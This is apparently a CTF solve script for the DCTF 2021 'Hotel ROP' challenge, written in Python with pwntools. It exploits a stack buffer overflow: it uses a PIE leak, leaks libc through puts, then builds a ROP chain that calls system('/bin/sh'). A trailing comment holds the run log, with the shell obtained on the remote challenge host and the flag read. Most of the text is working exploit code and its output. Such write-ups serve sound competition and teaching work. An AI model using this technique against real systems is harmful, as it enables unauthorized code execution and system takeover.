from pwn import *

#context.log_level = 'debug'

BINARY = './hotel_rop'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "dctf1-chall-hotel-rop.westeurope.azurecontainer.io"
  PORT = 7480
  s = remote(HOST, PORT)
  libc = ELF("./libc6_2.31-0ubuntu9.1_amd64.so")
else:
  s = process(BINARY)
  libc = elf.libc

pop_rdi_ret = 0x140b # pop rdi; ret; 
pop_rsi_ret = 0x1409 # pop rsi; pop r15; ret; 

s.recvuntil("Welcome to Hotel ROP, on main street 0x")
r = s.recvuntil("\n")[:-1]
pie_leak = int(r, 16)
pie_base = pie_leak - 0x136d
print "pie_leak =", hex(pie_base)

s.recvuntil("You come here often?\n")

buf  = "A" * 40
buf += p64(pie_base + pop_rdi_ret)
buf += p64(pie_base + elf.got.puts)
buf += p64(pie_base + elf.plt.puts)
buf += p64(pie_base + elf.sym.main)
s.sendline(buf)

s.recvuntil("I think you should come here more often.\n")
r = s.recvuntil("\n")[:-1]
puts_addr   = u64(r + b"\x00\x00")
libc_base   = puts_addr - libc.sym.puts
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search('/bin/sh'))

print("puts_addr   =", hex(puts_addr))
print("libc_base   =", hex(libc_base))
print("system_addr =", hex(system_addr))
print("binsh_addr  =", hex(binsh_addr))

s.recvuntil("You come here often?\n")

buf  = "A"*40
buf += p64(pie_base + pop_rdi_ret+1)
buf += p64(pie_base + pop_rdi_ret)
buf += p64(binsh_addr)
buf += p64(system_addr)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/DCTF_2021/Pwn_Hotel_ROP_400$ python solve.py r
[*] '/home/mito/CTF/DCTF_2021/Pwn_Hotel_ROP_400/hotel_rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to dctf1-chall-hotel-rop.westeurope.azurecontainer.io on port 7480: Done
[*] '/home/mito/CTF/DCTF_2021/Pwn_Hotel_ROP_400/libc6_2.31-0ubuntu9.1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
pie_leak = 0x556c68013000
('puts_addr   =', '0x7f8f4a5d55a0')
('libc_base   =', '0x7f8f4a54e000')
('system_addr =', '0x7f8f4a5a3410')
('binsh_addr  =', '0x7f8f4a7055aa')
[*] Switching to interactive mode
I think you should come here more often.
$ id
uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
$ ls -l
total 28
-rw-r--r-- 1 root  root     21 May 14 01:30 flag.txt
-rwxr-xr-x 1 pilot pilot 17096 May 14 01:30 hotel_rop
-rw-r--r-- 1 root  root    207 May 14 01:30 startService.sh
$ cat flag.txt
dctf{ch41n_0f_h0t3ls}
'''
